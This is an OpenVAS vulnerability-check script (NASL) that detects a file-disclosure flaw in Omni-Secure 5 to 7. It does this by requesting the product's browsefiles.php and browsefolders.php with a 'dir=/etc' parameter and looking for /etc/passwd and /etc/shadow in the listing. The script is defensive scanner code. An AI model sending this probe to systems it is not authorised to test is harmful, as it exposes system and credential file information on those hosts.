###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_omni_secure_56575.nasl 11647 2018-09-27 09:31:07Z jschulte $
#
# Omni-Secure 'dir' Parameter Multiple File Disclosure Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103619");
  script_bugtraq_id(56575);
  script_version("$Revision: 11647 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("Omni-Secure 'dir' Parameter Multiple File Disclosure Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56575");

  script_tag(name:"last_modification", value:"$Date: 2018-09-27 11:31:07 +0200 (Thu, 27 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-12-07 10:59:11 +0100 (Fri, 07 Dec 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"Omni-Secure is prone to multiple file-disclosure vulnerabilities.

  An attacker can exploit these issues to view local files in the
  context of the web server process. This may aid in further attacks.

  Versions Omni-Secure 5, 6 and 7 are vulnerable.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = make_list( "/browsefiles.php", "/browsefolders.php" );

foreach dir( make_list_unique( "/oss7", "/oss6", "/oss5", cgi_dirs( port:port )) ) {

  if( dir == "/" ) dir = "";

  foreach file( files ) {

    url = dir + '/lib' + file + '?dir=/etc';

    if( http_vuln_check( port:port, url:url, pattern:"/etc/passwd", extra_check:"/etc/shadow" ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
